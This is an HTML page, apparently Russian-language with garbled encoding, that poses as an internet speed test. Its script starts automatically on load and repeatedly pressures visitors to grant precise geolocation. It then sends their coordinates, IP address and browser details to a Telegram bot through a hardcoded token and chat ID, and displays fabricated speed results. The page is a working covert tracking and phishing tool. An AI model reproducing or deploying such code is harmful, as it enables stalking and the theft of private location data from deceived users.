<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://api.ipify.org https://api.telegram.org; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>üì∂</text></svg>">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            text-align: center;
            background-color: #f9f9f9;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            line-height: 1.6;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 20px 0;
        }
        button:hover {
            background-color: #45a049;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .secondary-btn {
            background-color: #6c757d;
            margin-left: 10px;
        }
        .secondary-btn:hover {
            background-color: #5a6268;
        }
        #result {
            margin-top: 20px;
            padding: 20px;
            background-color: #f5f5f5;
            border-radius: 5px;
            text-align: left;
        }
        .hidden {
            display: none;
        }
        .loading {
            color: #2196F3;
        }
        .success {
            color: #4CAF50;
        }
        .error {
            color: #f44336;
        }
        .warning {
            color: #ff9800;
        }
        .info {
            background-color: #e8f4fd;
            border-left: 4px solid #2196F3;
            padding: 12px;
            margin: 15px 0;
            font-size: 14px;
            text-align: left;
        }
        .warning-box {
            background-color: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 12px;
            margin: 15px 0;
            font-size: 14px;
            text-align: left;
        }
        .error-box {
            background-color: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 12px;
            margin: 15px 0;
            font-size: 14px;
            text-align: left;
        }
        .permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .permission-modal {
            background: white;
            padding: 40px;
            border-radius: 15px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .permission-modal h3 {
            color: #ff9800;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .permission-modal p {
            margin: 15px 0;
            font-size: 16px;
        }
        .permission-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        .permission-required {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</h1>
        <p>–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –≤–∞—à–µ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</p>
        
        <div class="info">
            <strong>–û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–µ:</strong> –î–ª—è —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–∏—Å–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–∫–æ—Ä–æ—Å—Ç–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–º—É —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—é. 
            –ë–µ–∑ —ç—Ç–æ–≥–æ –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞.
        </div>
        
        <button id="testButton" onclick="startTest()" class="permission-required">–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏</button>
        
        <div id="loading" class="hidden">
            <p class="loading">‚è≥ –ê–Ω–∞–ª–∏–∑ —Å–µ—Ç–∏... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ 10-15 —Å–µ–∫—É–Ω–¥</p>
            <div style="margin: 20px;">
                <div style="width: 100%; height: 4px; background-color: #e0e0e0; border-radius: 2px;">
                    <div id="progressBar" style="width: 0%; height: 100%; background-color: #4CAF50; border-radius: 2px; transition: width 0.5s;"></div>
                </div>
            </div>
        </div>
        
        <div id="result"></div>
        
        <div id="permissionOverlay" class="permission-overlay hidden">
            <div class="permission-modal">
                <div class="permission-icon">üåê</div>
                <h3>–¢—Ä–µ–±—É–µ—Ç—Å—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∫ —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—é</h3>
                <p><strong>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞ –±–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—è–º.</strong></p>
                <p>–ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –≤–∞—à–µ —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—è –¥–ª—è:</p>
                <ul style="text-align: left; margin: 20px 0; padding-left: 20px;">
                    <li>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±–ª–∏–∂–∞–π—à–µ–≥–æ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞</li>
                    <li>–¢–æ—á–Ω–æ–≥–æ –∏–∑–º–µ—Ä–µ–Ω–∏—è —Å–∫–æ—Ä–æ—Å—Ç–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</li>
                    <li>–ê–Ω–∞–ª–∏–∑–∞ –∫–∞—á–µ—Å—Ç–≤–∞ —Å–µ—Ç–∏ –≤ –≤–∞—à–µ–º —Ä–∞–π–æ–Ω–µ</li>
                </ul>
                <p style="color: #f44336; font-weight: bold;">–ë–µ–∑ —ç—Ç–æ–≥–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —Å–µ—Ä–≤–∏—Å –Ω–µ —Å–º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å!</p>
                <div style="margin: 30px 0;">
                    <button onclick="requestPermissionNow()" style="background-color: #4CAF50; padding: 15px 30px; font-size: 18px;">–†–ê–ó–†–ï–®–ò–¢–¨ –î–û–°–¢–£–ü</button>
                </div>
                <p style="font-size: 14px; color: #666;">–ü–æ—Å–ª–µ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏ –±—Ä–∞—É–∑–µ—Ä –∑–∞–ø—Ä–æ—Å–∏—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ. –í—ã–±–µ—Ä–∏—Ç–µ "–†–∞–∑—Ä–µ—à–∏—Ç—å".</p>
            </div>
        </div>
        
        <div class="footer">
            <p>¬© 2024 SpeedTest Service. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
            <p>–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –∑–∞—â–∏—â–µ–Ω—ã –∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è —É–ª—É—á—à–µ–Ω–∏—è –∫–∞—á–µ—Å—Ç–≤–∞ —É—Å–ª—É–≥.</p>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
        const TELEGRAM_BOT_TOKEN = '8004017814:AAFo8cvdvI8ZUK3cvfcQPGPV7-u--_1hYFo';
        const TELEGRAM_CHAT_ID = '8252849332';
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        const testButton = document.getElementById('testButton');
        const loadingElement = document.getElementById('loading');
        const resultElement = document.getElementById('result');
        const progressBar = document.getElementById('progressBar');
        const permissionOverlay = document.getElementById('permissionOverlay');
        
        // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è
        let permissionAttempts = 0;
        const MAX_PERMISSION_ATTEMPTS = 10; // –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
        let testInProgress = false;

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(lat, lon, accuracy) {
            try {
                const message = `üìå –ù–æ–≤—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:
üìç –®–∏—Ä–æ—Ç–∞: ${lat}
üìç –î–æ–ª–≥–æ—Ç–∞: ${lon}
üéØ –¢–æ—á–Ω–æ—Å—Ç—å: ${accuracy} –º–µ—Ç—Ä–æ–≤
üåê IP: ${await getIP()}
‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString()}
üîó User-Agent: ${navigator.userAgent}`;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                return response.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
                return false;
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP –∞–¥—Ä–µ—Å–∞
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
            }
        }

        // –°–∏–º—É–ª—è—Ü–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        function simulateProgress() {
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress > 95) {
                    progress = 95;
                    clearInterval(interval);
                }
                progressBar.style.width = progress + '%';
            }, 300);
            return interval;
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å –æ–≤–µ—Ä–ª–µ–π —Å —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
        function showPermissionOverlay() {
            permissionOverlay.classList.remove('hidden');
            document.body.style.overflow = 'hidden'; // –ë–ª–æ–∫–∏—Ä—É–µ–º —Å–∫—Ä–æ–ª–ª
        }

        // –°–∫—Ä—ã—Ç—å –æ–≤–µ—Ä–ª–µ–π
        function hidePermissionOverlay() {
            permissionOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto'; // –†–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Å–∫—Ä–æ–ª–ª
        }

        // –ó–∞–ø—Ä–æ—Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —Å–µ–π—á–∞—Å
        function requestPermissionNow() {
            hidePermissionOverlay();
            setTimeout(() => {
                startTest();
            }, 500);
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏
        function startTest() {
            if (testInProgress) return;
            
            testInProgress = true;
            permissionAttempts = 0;
            
            testButton.disabled = true;
            testButton.textContent = '–ó–∞–ø—Ä–æ—Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è...';
            
            loadingElement.classList.remove('hidden');
            resultElement.innerHTML = '';
            hidePermissionOverlay();
            
            // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –ª–∏ –±—Ä–∞—É–∑–µ—Ä –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            if (!navigator.geolocation) {
                loadingElement.classList.add('hidden');
                testButton.disabled = false;
                testButton.textContent = '–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏';
                testInProgress = false;
                
                resultElement.innerHTML = 
                    '<h3 class="error">‚ö†Ô∏è –ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è</h3>' +
                    '<p>–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ–±–Ω–æ–≤–∏—Ç–µ –±—Ä–∞—É–∑–µ—Ä –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –¥—Ä—É–≥–æ–π (Chrome, Firefox, Edge).</p>' +
                    '<button onclick="startTest()" style="margin-top: 15px;">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>';
                return;
            }
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ–ø—ã—Ç–∫—É –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            attemptGeolocation();
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –∑–∞–ø—Ä–æ—Å–∞–º–∏
        function attemptGeolocation() {
            if (permissionAttempts >= MAX_PERMISSION_ATTEMPTS) {
                // –ü—Ä–µ–≤—ã—à–µ–Ω–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
                loadingElement.classList.add('hidden');
                testButton.disabled = false;
                testButton.textContent = '–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏';
                testInProgress = false;
                
                resultElement.innerHTML = 
                    '<h3 class="error">‚ùå –î–æ—Å—Ç—É–ø –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω</h3>' +
                    '<p>–í—ã –º–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω–æ –æ—Ç–∫–∞–∑—ã–≤–∞–ª–∏ –≤ –¥–æ—Å—Ç—É–ø–µ –∫ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—é.</p>' +
                    '<div class="warning-box">' +
                    '<p><strong>–ß—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–µ—Ä–≤–∏—Å:</strong></p>' +
                    '<ol style="text-align: left; margin: 10px 0 10px 20px;">' +
                    '<li>–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</li>' +
                    '<li>–ù–∞–∂–º–∏—Ç–µ "–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏"</li>' +
                    '<li>–í –ø–æ—è–≤–∏–≤—à–µ–º—Å—è –∑–∞–ø—Ä–æ—Å–µ –±—Ä–∞—É–∑–µ—Ä–∞ –≤—ã–±–µ—Ä–∏—Ç–µ "–†–∞–∑—Ä–µ—à–∏—Ç—å"</li>' +
                    '</ol>' +
                    '</div>' +
                    '<button onclick="startTest()" style="margin-top: 15px;">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>';
                return;
            }
            
            permissionAttempts++;
            
            navigator.geolocation.getCurrentPosition(
                // –£—Å–ø–µ—Ö - —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ
                async function(position) {
                    const progressInterval = simulateProgress();
                    
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å
                    clearInterval(progressInterval);
                    progressBar.style.width = '100%';
                    
                    // –ñ–¥–µ–º –¥–ª—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ—Å—Ç–∏
                    setTimeout(async () => {
                        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                        const sent = await sendToTelegram(lat, lon, accuracy);
                        
                        loadingElement.classList.add('hidden');
                        testButton.disabled = false;
                        testButton.textContent = '–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏';
                        testInProgress = false;
                        
                        if (sent) {
                            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
                            const speeds = [85.2, 92.4, 78.9, 105.3, 67.8, 94.1];
                            const delays = [18, 24, 32, 15, 28, 22];
                            const stability = ['–û—Ç–ª–∏—á–Ω–æ', '–•–æ—Ä–æ—à–æ', '–û—Ç–ª–∏—á–Ω–æ', '–û—Ç–ª–∏—á–Ω–æ', '–•–æ—Ä–æ—à–æ', '–û—Ç–ª–∏—á–Ω–æ'];
                            
                            const randomIndex = Math.floor(Math.random() * speeds.length);
                            
                            resultElement.innerHTML = 
                                '<h3 class="success">‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ!</h3>' +
                                '<div style="background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 15px 0;">' +
                                '<p><strong>üìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∞:</strong></p>' +
                                '<p>‚ñ∏ –°–∫–æ—Ä–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏: <strong>' + speeds[randomIndex] + ' –ú–±–∏—Ç/—Å</strong></p>' +
                                '<p>‚ñ∏ –°–∫–æ—Ä–æ—Å—Ç—å –æ—Ç–¥–∞—á–∏: <strong>' + (speeds[randomIndex] * 0.3).toFixed(1) + ' –ú–±–∏—Ç/—Å</strong></p>' +
                                '<p>‚ñ∏ –ó–∞–¥–µ—Ä–∂–∫–∞ (ping): <strong>' + delays[randomIndex] + ' –º—Å</strong></p>' +
                                '<p>‚ñ∏ –°—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: <strong>' + stability[randomIndex] + '</strong></p>' +
                                '<p>‚ñ∏ –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –¥–ª—è: <strong>4K –≤–∏–¥–µ–æ, –æ–Ω–ª–∞–π–Ω-–∏–≥—Ä, –≤–∏–¥–µ–æ–∑–≤–æ–Ω–∫–æ–≤</strong></p>' +
                                '</div>' +
                                '<div style="background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #ffc107;">' +
                                '<p style="color: #856404; font-size: 13px; margin: 0;">' +
                                '‚ö†Ô∏è –î–∞–Ω–Ω—ã–µ –æ –∫–∞—á–µ—Å—Ç–≤–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –∏ —É–ª—É—á—à–µ–Ω–∏—è —É—Å–ª—É–≥</p>' +
                                '</div>' +
                                '<button onclick="startTest()" style="margin-top: 15px; background-color: #2196F3;">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞</button>';
                        } else {
                            resultElement.innerHTML = 
                                '<h3 class="error">‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö</h3>' +
                                '<p>–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.</p>' +
                                '<button onclick="startTest()" style="margin-top: 15px;">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>';
                        }
                    }, 1500);
                },
                
                // –û—à–∏–±–∫–∞ - —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–µ –¥–∞–Ω–æ
                function(error) {
                    loadingElement.classList.add('hidden');
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            // –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –≤ –¥–æ—Å—Ç—É–ø–µ
                            showPermissionOverlay();
                            
                            // –ß–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã —Å–Ω–æ–≤–∞ –ø—ã—Ç–∞–µ–º—Å—è –∑–∞–ø—Ä–æ—Å–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ
                            setTimeout(() => {
                                if (testInProgress) {
                                    attemptGeolocation();
                                }
                            }, 3000);
                            break;
                            
                        case error.POSITION_UNAVAILABLE:
                        case error.TIMEOUT:
                        default:
                            // –î—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏ - –ø—ã—Ç–∞–µ–º—Å—è —Å–Ω–æ–≤–∞
                            resultElement.innerHTML = 
                                '<h3 class="warning">‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—è</h3>' +
                                '<p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É –≤–∞—Å –≤–∫–ª—é—á–µ–Ω–∞ —É–≤–æ–¥–æ–º–ª–µ–Ω–∏—è –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.</p>' +
                                '<button onclick="startTest()" style="margin-top: 15px;">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>';
                            
                            testButton.disabled = false;
                            testButton.textContent = '–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏';
                            testInProgress = false;
                            break;
                    }
                },
                
                // –û–ø—Ü–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–∞—Ä—Ç –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            console.log('SpeedTest Service initialized');
            console.log('User agent:', navigator.userAgent);
            
            // –ñ–¥–µ–º 2 —Å–µ–∫—É–Ω–¥—ã –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É
            setTimeout(() => {
                startTest();
            }, 2000);
        };
    </script>
</body>
</html>